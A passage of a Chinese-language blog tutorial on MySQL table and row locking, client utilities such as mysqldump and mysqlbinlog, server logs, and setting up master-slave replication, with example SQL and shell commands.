<td>开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般。</td>
</tr>
</tbody></table>
<h3 id="MyISAM表锁"><a href="#MyISAM表锁" class="headerlink" title="MyISAM表锁"></a>MyISAM表锁</h3><p>MyISAM 存储引擎只支持表锁</p>
<h4 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h4><p><strong>自动加锁，不需要显式加锁</strong>(LOCK TABLE)</p>
<blockquote>
<ul>
<li><p>执行查询语句（SELECT）前，会自动给涉及的所有表加读锁，</p>
</li>
<li><p>执行更新操作（UPDATE、DELETE、INSERT 等）前，会自动给涉及的表加写锁，</p>
</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加读锁 ： lock table table_name read;</span><br><span class="line"></span><br><span class="line">加写锁 ： lock table table_name write；</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>并发读(读锁只能存在一个)，互斥写</strong></p>
</blockquote>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database demo_03 default charset&#x3D;utf8mb4;</span><br><span class="line"></span><br><span class="line">use demo_03;</span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;tb_book&#96; (</span><br><span class="line">  &#96;id&#96; INT(11) auto_increment,</span><br><span class="line">  &#96;name&#96; VARCHAR(50) DEFAULT NULL,</span><br><span class="line">  &#96;publish_time&#96; DATE DEFAULT NULL,</span><br><span class="line">  &#96;status&#96; CHAR(1) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;myisam DEFAULT CHARSET&#x3D;utf8 ;</span><br><span class="line"></span><br><span class="line">INSERT INTO tb_book (id, name, publish_time, status) VALUES(NULL,&#39;java编程思想&#39;,&#39;2088-08-01&#39;,&#39;1&#39;);</span><br><span class="line">INSERT INTO tb_book (id, name, publish_time, status) VALUES(NULL,&#39;solr编程思想&#39;,&#39;2088-08-08&#39;,&#39;0&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;tb_user&#96; (</span><br><span class="line">  &#96;id&#96; INT(11) auto_increment,</span><br><span class="line">  &#96;name&#96; VARCHAR(50) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;myisam DEFAULT CHARSET&#x3D;utf8 ;</span><br><span class="line"></span><br><span class="line">INSERT INTO tb_user (id, name) VALUES(NULL,&#39;令狐冲&#39;);</span><br><span class="line">INSERT INTO tb_user (id, name) VALUES(NULL,&#39;田伯光&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="读锁"><a href="#读锁" class="headerlink" title="读锁"></a>读锁</h4><blockquote>
<p><strong>加上读锁，不会阻塞其他线程的读操作，会阻塞写操作</strong></p>
</blockquote>
<blockquote>
<ul>
<li><p>对book表加锁，无法访问user等其他表===&gt;读锁只能存在一个</p>
</li>
<li><p>其他session也可以进行对book表进行读操作===&gt;并发读</p>
</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201022083945876.png" alt="image-20201022083945876" style="zoom:80%;" />

<blockquote>
<p>book表加上<strong>读锁</strong>，无法进行更新操作，其他客户端对该表进行更新操作也会进入阻塞状态。==&gt;互斥写</p>
</blockquote>
<h4 id="写锁"><a href="#写锁" class="headerlink" title="写锁"></a>写锁</h4><blockquote>
<p><strong>写锁阻塞其他线程的读操作和写操作，对本线程写锁表才可进行读写操作</strong></p>
</blockquote>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ul>
<li><p>MyISAM 表的读操作，不会阻塞其他用户对同一表的读请求，但会阻塞对同一表的写请求，也会阻塞本用户对其他表读操作；</p>
</li>
<li><p>对MyISAM 表的写操作，则会阻塞其他用户对同一表的读和写操作；</p>
</li>
</ul>
<p>​    简而言之，就是<strong>读锁会阻塞写，但是不会阻塞读。而写锁，则既会阻塞读，又会阻塞写。</strong></p>
<blockquote>
<p>此外，MyISAM 的读写锁调度是<strong>写优先</strong>，这也是MyISAM不适合做写为主的表的存储引擎的原因。</p>
<p>因为<strong>写锁后，其他线程不能做任何操作，大量的更新会使查询很难得到锁，从而造成永远阻塞。</strong></p>
</blockquote>
<h4 id="查看锁的争用情况"><a href="#查看锁的争用情况" class="headerlink" title="查看锁的争用情况"></a>查看锁的争用情况</h4><blockquote>
<p>In_user : 表当前被查询使用的次数。如果该数为零，则表是打开的，但是当前没有被使用。</p>
<p>Name_locked：表名称是否被锁定。名称锁定用于取消表或对表进行重命名等操作。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show open tables;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>Table_locks_immediate ： 指的是能够立即获得表级锁的次数，每立即获取锁，值加1。</p>
<p>Table_locks_waited ： 指的是不能立即获取表级锁而需要等待的次数，每等待一次，该值加1，此值高说明存在着较为严重的表级锁争用情况。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show status like &#39;Table_locks%&#39;;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201022092559705.png" alt="image-20201022092559705" style="zoom:80%;" />

<h3 id="InnoDB行锁"><a href="#InnoDB行锁" class="headerlink" title="InnoDB行锁"></a>InnoDB行锁</h3><blockquote>
<ul>
<li><p>偏向InnoDB 存储引擎，开销大，加锁慢；会出现死锁；</p>
</li>
<li><p>锁定粒度最小，发生锁冲突的概率最低,并发度也最高</p>
</li>
</ul>
</blockquote>
<blockquote>
<p>InnoDB 与 MyISAM 的最大不同有两点：一是支持事务；二是 采用了行级锁。</p>
</blockquote>
<h4 id="行锁模式"><a href="#行锁模式" class="headerlink" title="行锁模式"></a>行锁模式</h4><ul>
<li>共享锁（S）：又称为读锁，共享锁就是多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。</li>
<li>排他锁（X）：又称为写锁，排他锁就是不能与其他锁并存，如一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁，但是获取排他锁的事务是可以对数据就行读取和修改。</li>
</ul>
<blockquote>
<p>对于UPDATE、DELETE和INSERT语句，InnoDB会自动给涉及数据集加<strong>排他锁</strong></p>
<p>对于普通SELECT语句，InnoDB<strong>不会加任何锁</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">共享锁（S）：SELECT * FROM table_name WHERE ... LOCK IN SHARE MODE</span><br><span class="line"></span><br><span class="line">排他锁（X) ：SELECT * FROM table_name WHERE ... FOR UPDATE</span><br></pre></td></tr></table></figure>

<h4 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h4><p><strong>准备</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table test_innodb_lock(</span><br><span class="line">	id int(11),</span><br><span class="line">	name varchar(16),</span><br><span class="line">	sex varchar(1)</span><br><span class="line">)engine &#x3D; innodb default charset&#x3D;utf8;</span><br><span class="line"></span><br><span class="line">insert into test_innodb_lock values(1,&#39;100&#39;,&#39;1&#39;);</span><br><span class="line">insert into test_innodb_lock values(3,&#39;3&#39;,&#39;1&#39;);</span><br><span class="line">insert into test_innodb_lock values(4,&#39;400&#39;,&#39;0&#39;);</span><br><span class="line">insert into test_innodb_lock values(5,&#39;500&#39;,&#39;1&#39;);</span><br><span class="line">insert into test_innodb_lock values(6,&#39;600&#39;,&#39;0&#39;);</span><br><span class="line">insert into test_innodb_lock values(7,&#39;700&#39;,&#39;0&#39;);</span><br><span class="line">insert into test_innodb_lock values(8,&#39;800&#39;,&#39;1&#39;);</span><br><span class="line">insert into test_innodb_lock values(9,&#39;900&#39;,&#39;1&#39;);</span><br><span class="line">insert into test_innodb_lock values(1,&#39;200&#39;,&#39;0&#39;);</span><br><span class="line"></span><br><span class="line">create index idx_test_innodb_lock_id on test_innodb_lock(id);</span><br><span class="line">create index idx_test_innodb_lock_name on test_innodb_lock(name);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关闭自动提交功能</p>
<p>操作同一行数据，不提交。==&gt;其他事务会处于等待状态</p>
<p>操作不同行数据  ==&gt; 其他事务会执行更新</p>
</blockquote>
<h4 id="行锁升级为表锁"><a href="#行锁升级为表锁" class="headerlink" title="行锁升级为表锁"></a>行锁升级为表锁</h4><p>如果<strong>不通过索引条件检索数据</strong>，那么InnoDB将对表中的所有记录加锁，实际效果跟表锁一样</p>
<p><img src="https://csn.damyoung.cn/image-20201022175100893.png" alt="image-20201022175100893"></p>
<blockquote>
<p>处于阻塞状态</p>
<p>执行更新时 ， name字段本来为varchar类型， 我们是作为数组类型使用，<strong>存在类型转换，索引失效，最终行锁变为表锁</strong></p>
</blockquote>
<h4 id="间隙锁危害"><a href="#间隙锁危害" class="headerlink" title="间隙锁危害"></a>间隙锁危害</h4><p>当我们<strong>用范围条件</strong>，而不是使用相等条件检索数据，并请求共享或排他锁时，InnoDB会给符合条件的已有数据进行加锁； </p>
<blockquote>
<p>对于键值在<strong>条件范围内但并不存在的记录</strong>，叫做 “间隙（GAP）” ， InnoDB也会对这个 “间隙” 加锁，这种锁机制就是所谓的 间隙锁（Next-Key锁）   </p>
<p>i&lt;10  i= 1,2,  ,4,5 </p>
</blockquote>
<h4 id="行锁争用情况"><a href="#行锁争用情况" class="headerlink" title="行锁争用情况"></a>行锁争用情况</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show  status like &#39;innodb_row_lock%&#39;;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201022180443114.png" alt="image-20201022180443114" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Innodb_row_lock_current_waits: 当前正在等待锁定的数量</span><br><span class="line"></span><br><span class="line">Innodb_row_lock_time: 从系统启动到现在锁定总时间长度</span><br><span class="line"></span><br><span class="line">Innodb_row_lock_time_avg:每次等待所花平均时长</span><br><span class="line"></span><br><span class="line">Innodb_row_lock_time_max:从系统启动到现在等待最长的一次所花的时间</span><br><span class="line"></span><br><span class="line">Innodb_row_lock_waits: 系统启动后到现在总共等待的次数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当等待的次数很高，而且每次等待的时长也不小的时候，我们就需要分析系统中为什么会有如此多的等待，然后根据分析结果着手制定优化计划。</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>InnoDB存储引擎由于实现了行级锁定，虽然在锁定机制的实现方面带来了<strong>性能损耗</strong>可能比表锁会更高一些，但是在整体<strong>并发</strong>处理能力方面要远远由于MyISAM的表锁的。当</p>
<p>系统并发量较高的时候，InnoDB的整体性能和MyISAM相比就会有比较明显的优势。</p>
<p>但是，InnoDB的行级锁同样也有其脆弱的一面，当我们**使用不当的时候(无索引下，行锁升级成表锁)**，可能会让InnoDB的整体性能表现不仅不能比MyISAM高，甚至可能会更差。</p>
<p>优化建议：</p>
<ul>
<li>尽可能让所有数据检索都能通过<strong>索引</strong>来完成，避免无索引行锁升级为表锁。</li>
<li>合理设计索引，尽可能减少索引<strong>条件</strong>，及索引<strong>范围</strong>，避免<strong>间隙锁</strong></li>
<li>尽量控制<strong>事务大小</strong>，减少锁定<strong>资源量</strong>和<strong>时间</strong>长度</li>
<li>尽可使用低级别<strong>事务隔离</strong>（但是需要业务层面满足需求）</li>
</ul>
<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>该mysql不是指mysql服务，而是指mysql的<strong>客户端工具</strong>。</p>
<h3 id="连接选项"><a href="#连接选项" class="headerlink" title="连接选项"></a>连接选项</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数 ： </span><br><span class="line">	-u, --user&#x3D;name			指定用户名</span><br><span class="line">	-p, --password[&#x3D;name]	指定密码</span><br><span class="line">	-h, --host&#x3D;name			指定服务器IP或域名</span><br><span class="line">	-P, --port&#x3D;#			指定连接端口</span><br><span class="line"></span><br><span class="line">示例 ：</span><br><span class="line">	mysql -h 127.0.0.1 -P 3306 -u root -p</span><br><span class="line">	</span><br><span class="line">	mysql -h127.0.0.1 -P3306 -uroot -p2143</span><br></pre></td></tr></table></figure>

<h3 id="执行选项"><a href="#执行选项" class="headerlink" title="执行选项"></a>执行选项</h3><blockquote>
<p>-e, –execute=name        执行SQL语句并退出</p>
<p>Mysql客户端执行SQL语句，而不用连接到MySQL数据库再执行</p>
<p>对于一些批处理脚本，这种方式尤其方便。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p2143 数据库名 -e &quot;select * from tb_book&quot;;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201023093056385.png" alt="image-20201022215130425" style="zoom:80%;" />



<h2 id="mysqladmin"><a href="#mysqladmin" class="headerlink" title="mysqladmin"></a>mysqladmin</h2><p>mysqladmin 是一个<strong>执行管理操作</strong>的客户端程序。可以用它来检查服务器的配置和当前状态、创建并删除数据库等。</p>
<blockquote>
<p> mysqladmin –help  指令查看帮助文档</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201023093056385.png" alt="image-20201022215714698" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例 ：</span><br><span class="line">	mysqladmin -uroot -p2143 create &#39;test01&#39;;  </span><br><span class="line">	mysqladmin -uroot -p2143 drop &#39;test01&#39;;</span><br><span class="line">	mysqladmin -uroot -p2143 version;</span><br></pre></td></tr></table></figure>

<h2 id="mysqlbinlog"><a href="#mysqlbinlog" class="headerlink" title="mysqlbinlog"></a>mysqlbinlog</h2><p>由于服务器生成的二进制日志文件以二进制格式保存，所以如果想要检查这些文本的文本格式，就会使用到mysqlbinlog 日志管理工具。</p>
<blockquote>
<p>mysqlbinlog [options]  log-files1 log-files2 …</p>
<p>选项：<br>    -d, –database=name : 指定数据库名称，只列出指定的数据库相关操作。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-o, <span class="comment">--offset=# : 忽略掉日志中的前n行命令。</span></span><br><span class="line"></span><br><span class="line">-r,<span class="comment">--result-file=name : 将输出的文本格式日志输出到指定文件。</span></span><br><span class="line"></span><br><span class="line">-s, <span class="comment">--short-form : 显示简单格式， 省略掉一些信息。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--start-datatime=date1  --stop-datetime=date2 : 指定日期间隔内的所有日志。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--start-position=pos1 --stop-position=pos2 : 指定位置间隔内的所有日志。</span></span><br></pre></td></tr></table></figure>

<h2 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h2><p>用来<strong>备份</strong>数据库或在不同数据库之间进行<strong>数据迁移。</strong>备份内容包含创建表，及插入表的SQL语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqldump [options] db_name [tables]</span><br><span class="line"></span><br><span class="line">mysqldump [options] --database&#x2F;-B db1 [db2 db3...]</span><br><span class="line"></span><br><span class="line">mysqldump [options] --all-databases&#x2F;-A</span><br></pre></td></tr></table></figure>

<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">参数 ： </span><br><span class="line">	-u, <span class="comment">--user=name			指定用户名</span></span><br><span class="line">	-p, <span class="comment">--password[=name]	指定密码</span></span><br><span class="line">	-h, <span class="comment">--host=name			指定服务器IP或域名</span></span><br><span class="line">	-P, <span class="comment">--port=#			指定连接端口</span></span><br></pre></td></tr></table></figure>

<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">参数：</span><br><span class="line">	<span class="comment">--add-drop-database		在每个数据库创建语句前加上 Drop database 语句</span></span><br><span class="line">	<span class="comment">--add-drop-table		在每个表创建语句前加上 Drop table 语句 , 默认开启!! ; 不开启 (--skip-add-drop-table)</span></span><br><span class="line">	</span><br><span class="line">	-n, <span class="comment">--no-create-db		不包含数据库的创建语句</span></span><br><span class="line">	-t, <span class="comment">--no-create-info	不包含数据表的创建语句</span></span><br><span class="line">	-d <span class="comment">--no-data			不包含数据</span></span><br><span class="line">	</span><br><span class="line">	 -T, <span class="comment">--tab=name			自动生成两个文件：一个.sql文件，创建表结构的语句；</span></span><br><span class="line">	 						一个.txt文件，数据文件，相当于<span class="keyword">select</span> <span class="keyword">into</span> <span class="keyword">outfile</span>  </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -p123 demo_03 tb_book &gt; tb_book.sql;</span><br><span class="line">cat tb_book.sql;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 默认开启，可不加</span><br><span class="line">mysqldump -uroot -p123 demo_03 --add-drop-table &gt; demo_03.sql</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 一个.sql文件，创建表结构的语句；</span><br><span class="line">-- 一个.txt文件，数据文件，相当于select into outfile  </span><br><span class="line">mysqldump -uroot -p123 -T &#x2F;tmp demo_03 tb_book;</span><br></pre></td></tr></table></figure>

<h2 id="mysqlimport-source"><a href="#mysqlimport-source" class="headerlink" title="mysqlimport/source"></a>mysqlimport/source</h2><p>mysqlimport 是客户端数据导入工具，用来导入mysqldump 加 -T 参数后导出的<strong>文本文件</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqlimport [options]  db_name  textfile1  [textfile2...]</span><br><span class="line"></span><br><span class="line">mysqlimport -uroot -p2143 数据库名 &#x2F;tmp&#x2F;city.txt</span><br></pre></td></tr></table></figure>

<p>如果需要导入<strong>sql文件</strong>,可以使用mysql中的source 指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;root&#x2F;tb_book.sql</span><br></pre></td></tr></table></figure>

<h2 id="mysqlshow"><a href="#mysqlshow" class="headerlink" title="mysqlshow"></a>mysqlshow</h2><p>mysqlshow 客户端对象查找工具，用来很快地查找存在哪些数据库、数据库中的表、表中的列或者索引。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--count		显示数据库及表的统计信息（数据库，表 均可以不指定）-i			显示指定数据库或者指定表的状态信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查询每个数据库的表的数量及表中记录的数量mysqlshow -uroot -p2143 --count#查询test库中每个表中的字段书，及行数mysqlshow -uroot -p2143 test --count#查询test库中book表的详细情况mysqlshow -uroot -p2143 test book --count</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201023093056385.png" alt="image-20201022235838134" style="zoom:80%;" />

<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><p>记录着数据库工作的方方面面，以帮助数据库管理员追踪数据库曾经发生过的各种事件</p>
<blockquote>
<ul>
<li>错误日志</li>
<li>二进制日志（BINLOG 日志）</li>
<li>查询日志</li>
<li>慢查询日志</li>
</ul>
</blockquote>
<h2 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h2><p>记录了当 mysqld 启动和停止时，以及服务器在运行过程中发生任何严重错误时的相关信息。</p>
<p>当数据库出现任何故障导致无法正常使用时，可以首先查看此日志</p>
<img src="https://csn.damyoung.cn/image-20201023093056385.png" alt="image-20201023093056385" style="zoom:80%;" />

<h2 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h2><p>二进制日志（BINLOG）记录了所有的 <strong>DDL</strong>（数据定义语言）语句和 <strong>DML</strong>（数据操纵语言）语句，但是<strong>不包括数据查询语句</strong></p>
<p>此日志对于灾难时的数据恢复起着极其重要的作用，<strong>MySQL的主从复制， 就是通过该binlog实现的</strong>。</p>
<h3 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h3><blockquote>
<p>配置文件位置 : /etc/my.cnf</p>
<p>日志存放位置 : 配置时，给定了文件名但是没有指定路径，日志默认写入Mysql的数据目录。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#配置开启binlog日志， 日志的文件前缀为 mysqlbin -----&gt; 生成的文件名如 : mysqlbin.000001,mysqlbin.000002log_bin&#x3D;mysqlbin#配置二进制日志的格式binlog_format&#x3D;STATEMENT</span><br></pre></td></tr></table></figure>

<h3 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h3><h4 id="statement"><a href="#statement" class="headerlink" title="statement"></a>statement</h4><p>该日志格式在日志文件中记录的都是<strong>SQL语句</strong>（statement），每一条对数据进行修改的SQL都会记录在日志文件中，通过Mysql提供的mysqlbinlog工具，可以清晰的查看到每条语句的文本。主从复制的时候，从库（slave）会将日志解析为原文本，并在从库重新执行一次。</p>
<h4 id="row"><a href="#row" class="headerlink" title="row"></a>row</h4><p>该日志格式在日志文件中记录的是<strong>每一行的数据变更</strong>，而不是记录SQL语句。比如，执行SQL语句 ： update tb_book set status=’1’ , 如果是STATEMENT 日志格式，在日志中会记录一行SQL文件； 如果是ROW，由于是对全表进行更新，也就是每一行记录都会发生变更，ROW 格式的日志中会记录每一行的数据变更。</p>
<h4 id="mixed"><a href="#mixed" class="headerlink" title="mixed"></a>mixed</h4><p>这是目前MySQL默认的日志格式，即混合了STATEMENT 和 ROW两种格式。默认情况下采用STATEMENT，但是在一些特殊情况下采用ROW来进行记录。MIXED 格式能尽量利用两种模式的优点，而避开他们的缺点</p>
<h3 id="日志读取"><a href="#日志读取" class="headerlink" title="日志读取"></a>日志读取</h3><p>日志以二进制方式存储，不能直接读取，需要用mysqlbinlog工具来查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqlbinlog log-file;</span><br></pre></td></tr></table></figure>

<h4 id="查看statement格式日志"><a href="#查看statement格式日志" class="headerlink" title="查看statement格式日志"></a>查看statement格式日志</h4><p>/var/lib/mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 执行插入语句insert into tb_book values(null,&#39;Lucene&#39;,&#39;2088-05-01&#39;,&#39;0&#39;);</span><br></pre></td></tr></table></figure>

<p><strong>查看日志内容</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqlbinlog mysqlbing.00001;</span><br></pre></td></tr></table></figure>

<h4 id="查看row格式日志"><a href="#查看row格式日志" class="headerlink" title="查看row格式日志"></a>查看row格式日志</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置开启binlog日志， 日志的文件前缀为 mysqlbin -----&gt; 生成的文件名如 : mysqlbin.000001,mysqlbin.000002log_bin=mysqlbin#配置二进制日志的格式binlog_format=ROW</span></span><br></pre></td></tr></table></figure>

<h4 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqlbinlog -vv mysqlbin.000002 </span><br></pre></td></tr></table></figure>

<h4 id="删除日志s"><a href="#删除日志s" class="headerlink" title="删除日志s"></a>删除日志s</h4><ol>
<li><p>Reset Master</p>
</li>
<li><p>执行指令 <code> purge  master logs to &#39;mysqlbin.******&#39;</code> ，该命令将删除  <code> ******</code> 编号之前的所有日志。 </p>
</li>
<li><p>执行指令 <code> purge master logs before &#39;yyyy-mm-dd hh24:mi:ss&#39;</code> ，该命令将删除日志为 “yyyy-mm-dd hh24:mi:ss” 之前产生的所有日志</p>
</li>
<li><p>设置参数 –expire_logs_days=# ，此参数的含义是设置日志的过期天数， 过了指定的天数后日志将会被自动删除，这样将有利于减少DBA 管理日志的工作量。</p>
</li>
</ol>
<h2 id="查询日志"><a href="#查询日志" class="headerlink" title="查询日志"></a>查询日志</h2><p>查询日志中记录了客户端的<strong>所有操作语句</strong>，而二进制日志不包含查询数据的SQL语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#该选项用来开启查询日志 ， 可选值 ： 0 或者 1 ； 0 代表关闭， 1 代表开启 general_log&#x3D;1#设置日志的文件名 ， 如果没有指定， 默认的文件名为 host_name.log general_log_file&#x3D;file_name</span><br></pre></td></tr></table></figure>

<h2 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 该参数用来控制慢查询日志是否开启， 可取值： 1 和 0 ， 1 代表开启， 0 代表关闭slow_query_log=1 # 该参数用来指定慢查询日志的文件名slow_query_log_file=slow_query.log# 该选项用来配置查询的时间限制， 超过这个时间将认为值慢查询， 将需要进行日志记录， 默认10slong_query_time=10</span></span><br></pre></td></tr></table></figure>

<h1 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>复制是指将主数据库的<strong>DDL</strong> 和 <strong>DML</strong> 操作通过<strong>二进制日志</strong>传到从库服务器中，然后在从库上对这些日志重新执行（也叫重做），从而使得从库和主库的数据保持同步。</p>
<p>MySQL支持一台主库同时向多台从库进行复制， 从库同时也可以作为其他从服务器的主库，实现<strong>链状复制。</strong></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Master 主库在事务提交时，会把<strong>数据变更</strong>作为时间 Events 记录在二进制日志文件 <strong>Binlog</strong> 中。</p>
<p>主库推送二进制日志文件 Binlog 中的日志事件到从库的<strong>中继日志 Relay Log 。</strong></p>
<p>slave<strong>重做</strong>中继日志中的事件，将改变反映它自己的数据。</p>
<img src="https://csn.damyoung.cn/image-20201023093056385.png" alt="2111" style="zoom:80%;" />

<h2 id="复制优势"><a href="#复制优势" class="headerlink" title="复制优势"></a>复制优势</h2><ul>
<li>主库出现问题，可以<strong>快速切换到从库提供服务</strong>。</li>
<li>可以在<strong>从库上执行查询</strong>操作，从<strong>主库中更新</strong>，实现读写分离，降低主库的访问压力。</li>
<li>可以在<strong>从库中执行备份</strong>，以避免备份期间影响主库的服务。</li>
</ul>
<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h3 id="master"><a href="#master" class="headerlink" title="master"></a>master</h3><p><strong>配置文件</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">#mysql 服务ID,保证整个集群环境中唯一server-id=1#mysql binlog 日志的存储路径和文件名log-bin=/var/lib/mysql/mysqlbin#错误日志,默认已经开启#log-err#mysql的安装目录#basedir#mysql的临时目录#tmpdir#mysql的数据存放目录#datadir#是否只读,1 代表只读, 0 代表读写read-only=0#忽略的数据, 指不需要同步的数据库binlog-ignore-db=mysql#指定同步的数据库#binlog-do-db=db01</span><br></pre></td></tr></table></figure>

<p><strong>重启</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service mysql restart ；</span><br></pre></td></tr></table></figure>

<p><strong>创建同步数据的账户，并且进行授权操作：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grant replication slave on *.* to &#39;itcast&#39;@&#39;192.168.192.131&#39; identified by &#39;itcast&#39;;	flush privileges;</span><br></pre></td></tr></table></figure>

<p><strong>查看master状态：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show master status;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>File : 从哪个日志文件开始推送日志文件 </p>
<p>Position ： 从哪个位置开始推送日志</p>
<p>Binlog_Ignore_DB : 指定不需要同步的数据库</p>
</blockquote>
<h3 id="slave"><a href="#slave" class="headerlink" title="slave"></a>slave</h3><p>在slave端配置文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">#mysql服务端ID,唯一server-id=2#指定binlog日志log-bin=/var/lib/mysql/mysqlbin</span><br></pre></td></tr></table></figure>

<p>重启mysql</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">service mysql restart；</span><br></pre></td></tr></table></figure>

<p>指定当前从库对应的主库的IP地址，用户名，密码，从哪个日志文件开始的那个位置开始同步推送日志</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">change master to master_host= <span class="string">&#x27;192.168.192.130&#x27;</span>, master_user=<span class="string">&#x27;itcast&#x27;</span>, master_password=<span class="string">&#x27;itcast&#x27;</span>, master_log_file=<span class="string">&#x27;mysqlbin.000001&#x27;</span>, master_log_pos=<span class="number">413</span>;</span><br></pre></td></tr></table></figure>

<p>开启同步操作</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">start slave;show slave status;</span><br></pre></td></tr></table></figure>

<p>停止同步</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">stop slave;</span><br></pre></td></tr></table></figure>

<h3 id="验证同步操作"><a href="#验证同步操作" class="headerlink" title="验证同步操作"></a>验证同步操作</h3><p>主库中创建数据库</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">create database db01;user db01;create table user(	id int(<span class="number">11</span>) not <span class="literal">null</span> auto_increment,	name varchar(<span class="number">50</span>) not <span class="literal">null</span>,	sex varchar(<span class="number">1</span>),	primary key (id))engine=innodb <span class="keyword">default</span> charset=utf8;insert into user(id,name,sex) values(<span class="literal">null</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);insert into user(id,name,sex) values(<span class="literal">null</span>,<span class="string">&#x27;Trigger&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);insert into user(id,name,sex) values(<span class="literal">null</span>,<span 